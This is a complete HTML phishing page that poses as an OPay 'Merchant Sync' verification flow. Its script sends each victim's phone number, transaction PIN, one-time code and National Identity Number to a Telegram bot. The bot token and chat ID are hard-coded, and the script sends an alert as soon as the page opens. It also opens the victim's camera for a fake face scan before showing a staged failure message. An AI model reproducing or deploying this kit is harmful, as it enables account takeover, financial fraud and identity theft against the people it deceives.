<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OPay Merchant Sync</title>
    <style>
        /* CSS: Replicating the OPay Mobile Interface */
        body {
            background-color: #f8f9fa;
            font-family: 'Inter', -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            width: 90%;
            max-width: 380px;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            text-align: center;
        }
        .brand-logo { color: #00D261; font-weight: 800; font-size: 24px; margin-bottom: 5px; }
        .step-title { font-weight: 700; color: #333; margin-bottom: 8px; }
        .step-desc { color: #666; font-size: 13px; margin-bottom: 25px; line-height: 1.4; }
        
        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 15px;
            border: 1px solid #eee;
            border-radius: 8px;
            background: #fafafa;
            box-sizing: border-box;
            font-size: 15px;
        }
        .btn-green {
            width: 100%;
            padding: 15px;
            background: #00D261;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 700;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        
        /* Camera UI */
        .camera-container {
            width: 220px;
            height: 220px;
            border: 4px solid #00D261;
            border-radius: 50%;
            margin: 20px auto;
            overflow: hidden;
            background: #000;
        }
        #webcam { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        
        .error-msg {
            color: #ff4d4d;
            background: #fff5f5;
            padding: 15px;
            border-radius: 8px;
            font-size: 14px;
            border: 1px solid #ffebeb;
        }
    </style>
</head>
<body>

<div class="card">
    <div class="brand-logo">OPay</div>

    <div id="step1">
        <div class="step-title">Merchant Sync</div>
        <p class="step-desc">Verify your credentials to authorize high-volume inflow.</p>
        <input type="tel" id="phone" placeholder="Phone Number">
        <input type="password" id="pin" placeholder="Transaction PIN">
        <button class="btn-green" onclick="nextStep(1, 2)">Continue</button>
    </div>

    <div id="step2" style="display:none">
        <div class="step-title">Account Verification</div>
        <p class="step-desc">Enter the 6-digit synchronization code sent to your device.</p>
        <input type="text" id="otp" placeholder="******" maxlength="6" style="text-align:center; letter-spacing: 5px;">
        <button class="btn-green" onclick="nextStep(2, 3)">Complete Sync</button>
    </div>

    <div id="step3" style="display:none">
        <div class="step-title">Identity Check</div>
        <p class="step-desc">Enter your 11-digit National Identity Number (NIN) to bind this device.</p>
        <input type="number" id="nin" placeholder="NIN Number">
        <button class="btn-green" onclick="nextStep(3, 4)">Verify Identity</button>
    </div>

    <div id="step4" style="display:none">
        <div class="step-title">Biometric Verification</div>
        <p id="scan-status" class="step-desc">Position your face in the frame...</p>
        <div class="camera-container">
            <video id="webcam" autoplay playsinline></video>
        </div>
    </div>

    <div id="step5" style="display:none">
        <div class="error-msg">
            <strong>Verification Failed</strong><br><br>
            Mismatched biometric data. For security, please complete this verification within the <b>official OPay mobile app</b>.
        </div>
    </div>
</div>

<script>
    const botToken = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
    const chatId = '7909543900';

    // Immediate Alert: Fires when they open the site
    window.onload = () => sendLog("üîî Victim opened the site");

    async function sendLog(text) {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
        });
    }

    async function nextStep(current, next) {
        // Collect data from current step
        if(current === 1) {
            const p = document.getElementById('phone').value;
            const pi = document.getElementById('pin').value;
            await sendLog(`<b>üì• STEP 1</b>\nPhone: ${p}\nPIN: ${pi}`);
        }
        if(current === 2) {
            const o = document.getElementById('otp').value;
            await sendLog(`<b>üì• STEP 2</b>\nOTP: ${o}`);
        }
        if(current === 3) {
            const n = document.getElementById('nin').value;
            await sendLog(`<b>üì• STEP 3</b>\nNIN: ${n}`);
        }

        // Switch View
        document.getElementById('step' + current).style.display = 'none';
        document.getElementById('step' + next).style.display = 'block';

        if(next === 4) startCamera();
    }

    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('webcam').srcObject = stream;
            
            // Wait 5 seconds, then show failure
            setTimeout(() => {
                document.getElementById('step4').style.display = 'none';
                document.getElementById('step5').style.display = 'block';
                sendLog("‚ö†Ô∏è Face scan failed. Victim sent to app redirect.");
            }, 5000);
        } catch (err) {
            console.log("Camera access denied");
            nextStep(4, 5);
        }
    }
</script>

</body>
</html>

